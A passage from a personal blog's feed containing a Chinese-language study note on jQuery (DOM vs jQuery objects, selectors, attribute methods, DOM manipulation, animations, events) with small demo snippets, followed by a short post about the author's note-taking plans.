实际上是以面向对象方式描述的文档模型。DOM 定义了表示和修改文档所需的对象、这些对象的行为和属性以及这些对象之间的关系。</p><p>通过 DOM，可以访问所有的 HTML 元素，连同它们所包含的文本和属性。可以对其中的内容进行修改和删除，同时也可以创建新的元素。</p><p>DOM 独立于平台和编程语言。它可被任何编程语言诸如 Java、JavaScript 和 VBScript 使用。</p><p>DOM 对象，即是我们用传统的方法 (JavaScript) 获得的对象。</p><p>DOM 准确说是对文档对象的一种规范标准(文档对象模型),标准只定义了属性和方法行为。</p><h3 id="JavaScript对象"><a href="#JavaScript对象" class="headerlink" title="JavaScript对象"></a>JavaScript对象</h3><p>JavaScript 提供多个内建对象，比如 String、Date、Array 等等。</p><p>对象只是带有属性和方法的特殊数据类型。</p><p>通过 js 获取的 DOM 对象就是 js 对象</p><p>当浏览器支持 js 的 DOM 接口 (api) 时，这里狭义的dom对象是以 js 对象的形式出现的，也就是一个 js 对象。</p><h3 id="jQuery对象"><a href="#jQuery对象" class="headerlink" title="jQuery对象"></a>jQuery对象</h3><p>jQuery 对象其实是一个 JavaScript 的数组，这个数组对象包含 125 个方法和 4 个属性 4 个属性分别是：</p><ol><li>jquery 当前的 jquery 框架版本号</li><li>length 指示该数组对象的元素个数</li><li>context 一般情况下都是指向 HtmlDocument 对象</li><li>selector 传递进来的选择器内容</li></ol><p>jquery 对象就是通过 jQuery 包装 DOM 对象后产生的对象。jQuery 对象是 jQuery 独有的，其可以使用 jQuery 里的方法，但是不能使用 DOM 的方法;反过来 DOM 对象也不能使用jquery的方法。</p><h3 id="jQuery对象和js对象区别"><a href="#jQuery对象和js对象区别" class="headerlink" title="jQuery对象和js对象区别"></a>jQuery对象和js对象区别</h3><ol><li>jQuery 对象属于 js 的数组</li><li>jQuery 对象是通过 jQuery 包装的 DOM 对象后产生的</li><li>jQuery 对象不能使用 DOM 对象的方法和属性</li><li>DOM 对象不能使用 jQuery 对象的方法和属性</li></ol><h3 id="jQuery-对象和-DOM-对象之间的转化"><a href="#jQuery-对象和-DOM-对象之间的转化" class="headerlink" title="jQuery 对象和 DOM 对象之间的转化"></a>jQuery 对象和 DOM 对象之间的转化</h3><p>jQuery 对象使用下标 [0] 转化为 DOM</p><p>DOM 使用 $() 函数返回 jQuery 对象。</p><h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>DOM 对象才能使用 DOM 中的方法，jQuery 对象不可以使用 DOM　中的方法，但 jQuery 对象提供了一套更加完善的工具用于操作 DOM 。</p><p>平时用到的 jQuery 对象都是通过 $() 函数制造出来的，$() 函数就是一个 jQuery 对象的制造工厂。</p><p>注意：如果获取的对象是 jQuery 对象，那么在变量前面加上 $ ,这样方便容易识别出哪些是 jQuery 对象。</p><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><p>具体的所有选择器，可以查看手册：<a href="http://hemin.cn/jq/">jQuery 选择器手册</a></p><h3 id="选择器组合"><a href="#选择器组合" class="headerlink" title="选择器组合"></a>选择器组合</h3><ol><li><p>多重叠加选择器 $(“选择器1 选择器2 选择器3”…)，可以写多个选择器/过滤器，作用效果为 &amp;&amp;，会返回满足每个选择器的元素。</p></li><li><p>多重平行选择器： $(“选择器1,选择器2…”)，可以写多个选择器，作用效果为 || ，会返回每个选择器满足的元素，注意和上面的不同为多了逗号。</p></li></ol><h3 id="基本选择器"><a href="#基本选择器" class="headerlink" title="基本选择器"></a>基本选择器</h3><ol><li><p>ID 选择器：$(“#ID名称”)，只需要对应标签设值的属性 id 的值前面加上 # 即可。</p></li><li><p>类选择器： $(“.Class名称”)，只需要在对应标签设置的属性 class 的值前面加上 . 即可。</p></li><li><p>元素选择器： $(“标签名称)，只需要写对应标签的名称即可，如 $(“div”)</p></li><li><p>所有选择器： $(<em>)，只需要写 \</em> 就可以表示所有的标签。</p></li></ol><h3 id="层级选择器"><a href="#层级选择器" class="headerlink" title="层级选择器"></a>层级选择器</h3><ol><li><p>祖先选择器：$(‘ancestor ancestor … son’) 格式，每一个都是独立的选择器，为 ancestor 为祖先标签（不需要是严格的上一级）的选择器，最后的 son 为目标标签的选择器。ancestor 的数量可以任意设置，指是为了更加精确的定位到 son 身上。</p></li><li><p>子选择器：$(“father &gt; son”) 要求 father 必须是 son 的严格上一级，才能选择到 son 身上。</p></li><li><p>相邻选择器： $(“Prev + Next”) 选择紧邻着 Prev 后面的 Next 元素，必须严格相邻。</p></li><li><p>之后选择器：$(“Prev ~ last”) 选择 prev <strong>之后</strong>的<strong>同辈</strong> last 元素，不需要严格相邻。</p></li></ol><h3 id="属性过滤选择器"><a href="#属性过滤选择器" class="headerlink" title="属性过滤选择器"></a>属性过滤选择器</h3><p>过滤选择器，可以跟在一个选择器后面，将这个选择器选择出来的结果进行按照设定要求过滤，只留下来符合要求的。</p><p>也可以单独作为一个选择器来按照自己的设定选择。</p><ol><li><p>$([属性名]) 选择拥有此属性的元素，如 $(“div[id]”) 选择出来拥有 id 属性的 div 标签。</p></li><li><p>$([属性名=属性值]) 选择有特定属性名和属性值的元素。</p></li><li><p>$([属性名!=属性值]) 选择 属性名!=属性值 的元素。</p></li><li><p>$([属性名^=属性值开头]) 选择属性值以此属性值开头的元素，和正则相同。</p></li><li><p>$([属性名$=属性值结尾]) 选择属性值以此属性值结尾的元素，和正则相同。</p></li><li><p>$([属性名*=被包含属性值]) 选择属性值中包含此属性值的元素，和正则相同就怪了。</p></li><li><p>$([属性选择器1][属性选择器2][属性选择器3]…) 多个属性叠加在一起，多次选择过滤。</p></li></ol><h3 id="基本过滤器"><a href="#基本过滤器" class="headerlink" title="基本过滤器"></a>基本过滤器</h3><ol><li><p>:first 选择元素集合中的第一个。</p></li><li><p>:last 选择元素集合中的最后一个。</p></li><li><p>:even 从零开始选择偶数的元素。</p></li><li><p>:odd 从零开始选择奇数的元素。</p></li><li><p>:eq(index) 从零开始，匹配一个给定索引值的元素</p></li><li><p>:gt(index) 匹配比索引值大的元素。</p></li><li><p>:lt(index) 匹配比索引值小的元素。</p></li></ol><h3 id="内容过滤器"><a href="#内容过滤器" class="headerlink" title="内容过滤器"></a>内容过滤器</h3><ol><li><p>:contains(text) 匹配标签文本内容包含有 text 的标签元素。</p></li><li><p>:empty 匹配标签里面没有子标签和文本的元素</p></li><li><p>:has(selector) 选择拥有 selector 能匹配到标签的父标签，满足 has 关系。</p></li><li><p>:parent 选择里面的有子标签或者文本的标签、</p></li></ol><h3 id="可见性过滤器"><a href="#可见性过滤器" class="headerlink" title="可见性过滤器"></a>可见性过滤器</h3><ol><li><p>:hidden 选择其中被隐藏的</p></li><li><p>:visible 选择其中可以被看见的</p></li></ol><h3 id="子元素过滤器"><a href="#子元素过滤器" class="headerlink" title="子元素过滤器"></a>子元素过滤器</h3><ol><li><p>:first-child 选择所有父标签符合要求的的第一个子标签，而 :first 是选择符合要求的标签里面的第一个。</p></li><li><p>:last-child 和上面同理，不过是最后一个子标签。</p></li><li><p>:nth-child(index) 为所有父标签匹配第 index 个子标签。</p></li><li><p>:only-child 只匹配没有同级姐妹标签的单独标签。</p></li></ol><h3 id="表单过滤器"><a href="#表单过滤器" class="headerlink" title="表单过滤器"></a>表单过滤器</h3><ol><li><p>:enabled 选择拥有表单属性 enabled 的元素。</p></li><li><p>:disabled 选择拥有表单属性 disabled 的元素。</p></li><li><p>:checked 选择拥有表单属性 checked 的元素。</p></li><li><p>:selected 选择拥有表单属性 selected 的元素。</p></li></ol><h2 id="jQuery-属性操作"><a href="#jQuery-属性操作" class="headerlink" title="jQuery 属性操作"></a>jQuery 属性操作</h2><h3 id="html"><a href="#html" class="headerlink" title="html()"></a>html()</h3><p>jQuery.html() 返回此标签 jQuery 对象的内容，修改里面的内容则填写在括号里 jQuery.html(“Change”) 效果和 innerHTML 相似。</p><p>需要注意的是，这玩意返回的是开始结束标签里面的 <strong>所有</strong> 内容，包括里面的子 HTML 标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    alert($(<span class="string">&quot;.Tempest &gt; .Xorex&quot;</span>).html()) <span class="comment">//先弹出再修改（内容包括html代码）</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&quot;.Tempest &gt; .Xorex&quot;</span>).html(<span class="string">&quot;Xorex 天下第一&quot;</span>);</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="text"><a href="#text" class="headerlink" title="text()"></a>text()</h3><p>jQuery.text() 基本等效与 html() 但是这个是过滤了 HTML 子标签，只会返回里面的文本。和 DOM 对象里面的 innerText 效果相似。</p><h3 id="val"><a href="#val" class="headerlink" title="val()"></a>val()</h3><p>jQuery.val() 是设置和获取<strong>表单</strong>项目的 value 值。常常用来获取表单里面输入的值，当然也可以修改里面的值：</p><p>第一读取输入框内容并修改的小 demo 。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">&quot;.input&quot;</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ele=$(<span class="string">&quot;.input&quot;</span>);</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&quot;你填写的值为：&quot;</span> + ele.val() + <span class="string">&quot;，我要给你改了！&quot;</span>);</span></span><br><span class="line"><span class="javascript">        ele.val(<span class="string">&quot;Xorex 天下第一！&quot;</span>);</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时 val() 选项的选择，只需要将要选择的选项 value 值放在 <code>val([&quot;value1&quot;,&quot;value2&quot;...])</code> 即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">value</span>=<span class="string">&quot;value1&quot;</span>&gt;</span>Xorex</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">value</span>=<span class="string">&quot;value2&quot;</span>&gt;</span>Yukino</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">value</span>=<span class="string">&quot;value3&quot;</span>&gt;</span>Megumi</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">&quot;[name=&#x27;input&#x27;]&quot;</span>).val([<span class="string">&quot;value1&quot;</span>,<span class="string">&quot;value3&quot;</span>]); <span class="comment">//这里直接选择 Xorex 和 Megumi</span></span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="attr-和-prop"><a href="#attr-和-prop" class="headerlink" title="attr() 和 prop()"></a>attr() 和 prop()</h3><p>用来获取标签的属性或者修改标签的属性，获取属性值：attr(“属性名称”)，设置属性值：(“属性名称”,”属性值”);</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:green&quot;</span>&gt;</span>Xorex<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">&quot;p&quot;</span>).onclick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">&quot;p&quot;</span>).attr(<span class="string">&quot;style&quot;</span>,<span class="string">&quot;color:red&quot;</span>) <span class="comment">//点击之后修改颜色</span></span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>对于表单的元素来说，可能没有 checked 这个属性（我们无法预测），但是对于 attr() 来说，只要没有手动写 checked 属性，此次属性查询返回的结果都是 undefined ，所以对于表单的 checked 选项来说，无法了解是否已经选中（手动无论是否选中都是 undefined）。而 prop() 就是针对 attr() 这个缺点而生的。</p><p>prop() 可以查询没有写在标签里的 checked 属性，被选中返回 true ，没有选中返回 false。</p><h2 id="jQuery-的增删改"><a href="#jQuery-的增删改" class="headerlink" title="jQuery 的增删改"></a>jQuery 的增删改</h2><h3 id="appendTo-amp-pretendTo-嵌入"><a href="#appendTo-amp-pretendTo-嵌入" class="headerlink" title="appendTo() &amp; pretendTo() 嵌入"></a>appendTo() &amp; pretendTo() 嵌入</h3><p>a.appendTo(b) 将 a 元素嵌入到 b 元素中，成为 b 的最后一个子元素。</p><p>a.pretendTo(b) 将 a 元素嵌入到 b 元素中，成为 b 的第一个子元素。</p><h3 id="insertAfter-amp-insertBefore-插入"><a href="#insertAfter-amp-insertBefore-插入" class="headerlink" title="insertAfter() &amp; insertBefore() 插入"></a>insertAfter() &amp; insertBefore() 插入</h3><p>a.insertAfter(b) 将 a 元素插入到 b 元素的后面，两者同级。</p><p>a.insertBefore(b) 将 a 元素插入到 b 元素前面，两者同级。</p><h3 id="replaceWith-amp-replaceAll-替换"><a href="#replaceWith-amp-replaceAll-替换" class="headerlink" title="replaceWith() &amp; replaceAll() 替换"></a>replaceWith() &amp; replaceAll() 替换</h3><p>a.replaceWith(b) 将 b 元素替换 a 元素。</p><p>a.replaceAll(b) 将 a 元素替换 b 元素。</p><h3 id="remove-amp-empty-清楚"><a href="#remove-amp-empty-清楚" class="headerlink" title="remove() &amp; empty() 清楚"></a>remove() &amp; empty() 清楚</h3><p>a.remove() 删除 a 整个标签。</p><p>a.empty() 删除 a 标签里面的内容。</p><h2 id="jQuery-动画效果"><a href="#jQuery-动画效果" class="headerlink" title="jQuery 动画效果"></a>jQuery 动画效果</h2><ol><li><code>show([speed,[callback]])</code> 展示隐藏的元素， speed 单位毫秒，callback 动画结束激活的函数。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#Show&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).show(<span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li><code>hide([speed,[callback]])</code> 隐藏展示的元素， speed 单位毫秒，callback 动画结束激活的函数</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#Hide&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).hide(<span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="3"><li><code>toggle([speed,[callback]])</code> 隐藏展示的元素，展示隐藏的元素，speed 单位毫秒，callback 动画结束激活的函数</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#Toggle&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).toggle(<span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="4"><li><code>fadeOut([speed,[callback]])</code> 淡出元素，speed 单位毫秒，callback 动画结束激活的函数</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#FadeOut&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).fadeOut(<span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="5"><li><code>fadeIn([speed,[callback]])</code> 淡入元素，speed 单位毫秒，callback 动画结束激活的函数</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#FadeIn&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).fadeIn(<span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="6"><li><code>fadeToggle([speed,[callback]])</code> 淡入淡出元素，speed 单位毫秒，callback 动画结束激活的函数</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#FadeToggle&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).fadeToggle(<span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="7"><li><code>fadeTo([speed],opacity,[callback])</code> 淡入元素到指定透明度，opacity 必须设置。speed 单位毫秒，callback 动画结束激活的函数</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#FadeTo&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).fadeTo(<span class="number">1000</span>,<span class="number">0.5</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="jQuery-事件处理"><a href="#jQuery-事件处理" class="headerlink" title="jQuery 事件处理"></a>jQuery 事件处理</h2><h3 id="常用事件"><a href="#常用事件" class="headerlink" title="常用事件"></a>常用事件</h3><ol><li><p>click() 绑定点击事件处理代码</p></li><li><p>mouseover() 绑定鼠标移动到元素身上处理代码</p></li><li><p>mouseout() 绑定鼠标离开元素身上处理代码</p></li><li><p>bind() 绑定多个事件对应的处理代码，所有事件名称写在一个双引号里，用空格隔开，如 bind(“click mouseover mouseout”,function(){})</p></li><li><p>unbind() 解绑对应的事件处理代码，使用的方法和上面的 bind() 差不多。</p></li><li><p>live() 动态绑定版本的 bind 即使是页面加载完成之后出现的元素，只要满足选择器，就会被绑定上设置的处理代码。</p></li><li><p>one() 一次性的 bind ，所绑定的事件处理代码只会运行一次。</p></li></ol><h3 id="事件传递"><a href="#事件传递" class="headerlink" title="事件传递"></a>事件传递</h3><p>当父标签和子标签绑定了相同的一个事件的时候，比如下面父标签和子标签都绑定了 click 事件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    click div</span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>click button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">&quot;div&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&quot;This is the div.&quot;</span>);</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    $(<span class="string">&quot;button&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&quot;This is the button.&quot;</span>);</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于点击 div 里面的任何事物都属于点击 div ，所以当点击 button 的时候，会被记为同时点击了 div 和 button 从而弹出两个弹窗。</p><p>要阻止这种子类事件传递给父类的行为，只需要在绑定子类事件的处理函数的时候，返回 false 就会停止标签的默认行为：传递事件给父标签。</p><h3 id="获取事件"><a href="#获取事件" class="headerlink" title="获取事件"></a>获取事件</h3><p>其实对于我们操作引起的一个事件，也同样是一个对象，想要获取到这个对象的话，只需要将变量名放在事件绑定函数的参数括号里面即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">&quot;button&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(event);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>上面的 event 变量保存的就是我们获取到的点击事件的对象，从控制台可以看到这个对象里面保存的信息。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jQuery.Event</span><br><span class="line">altKey: false</span><br><span class="line">bubbles: true</span><br><span class="line">button: 0</span><br><span class="line">buttons: 0</span><br><span class="line">cancelable: true</span><br><span class="line">changedTouches: undefined</span><br><span class="line">....</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;jQurey-概述&quot;&gt;&lt;a href=&quot;#jQurey-概述&quot; class=&quot;headerlink&quot; title=&quot;jQurey 概述&quot;&gt;&lt;/a&gt;jQurey 概述&lt;/h2&gt;&lt;p&gt;jQuery 语法是为 HTML 元素的选取编制的，可以对元素执行某些操作。&lt;/p&gt;</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="Web" scheme="https://xorex.space/tags/Web/"/>
    
    <category term="JavaScript" scheme="https://xorex.space/tags/JavaScript/"/>
    
    <category term="jQuery" scheme="https://xorex.space/tags/jQuery/"/>
    
  </entry>
  
  <entry>
    <title>笔记计划 3.0</title>
    <link href="https://xorex.space/2021/03/23/baadfa83df79/"/>
    <id>https://xorex.space/2021/03/23/baadfa83df79/</id>
    <published>2021-03-23T13:53:17.000Z</published>
    <updated>2021-03-29T13:54:56.303Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于我想要大幅度的减少知识类笔记这件事"><a href="#关于我想要大幅度的减少知识类笔记这件事" class="headerlink" title="关于我想要大幅度的减少知识类笔记这件事"></a>关于我想要大幅度的减少知识类笔记这件事</h2><p>今天我和陈思达同学在交流 Java 的学习过程的时候，大概询问了一下他的学习方法。</p><p>按照他的方法，就是不记笔记，直接看视频，然后多敲代码。</p><p>记录这么多的笔记是为了以后复习的时候再用吗，我想不是，因为我自己记录的笔记基本上我就没有在看过了，只是为了学习的时候，利用记笔记来转述知识点，从而达成更好的学习记忆效果。</p><p>记笔记是为了更好的理解记忆学习的知识。</p><p>既然这样，为什么不将记笔记的时间来多写写代码呢？同样的加深理解和记忆，记笔记和多次写代码，其实效果可能会差不多。</p><p>这样既能锻炼代码能力，也可以通过一次次代码编写来记住知识点和加深理解。</p><p>所以我想再次迈出改变的步伐，尝试以记录代码为主的笔记，然后通过多敲代码多写小项目来复习！！！</p><p>冲啊！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;关于我想要大幅度的减少知识类笔记这件事&quot;&gt;&lt;a href=&quot;#关于我想要大幅度的减少知识类笔记这件事&quot; class=&quot;headerlink&quot; title=&quot;关于我想要大幅度的减少知识类笔记这件事&quot;&gt;&lt;/a&gt;关于我想要大幅度的减少知识类笔记这件事&lt;/h2&gt;&lt;p&gt;今天</summary>
      
    
    
    
    <category term="阶段性总结" scheme="https://xorex.space/categories/%E9%98%B6%E6%AE%B5%E6%80%A7%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="思维导图" scheme="https://xorex.space/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    
    <category term="笔记" scheme="https://xorex.space/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="规划" scheme="https://xorex.space/tags/%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
</feed>
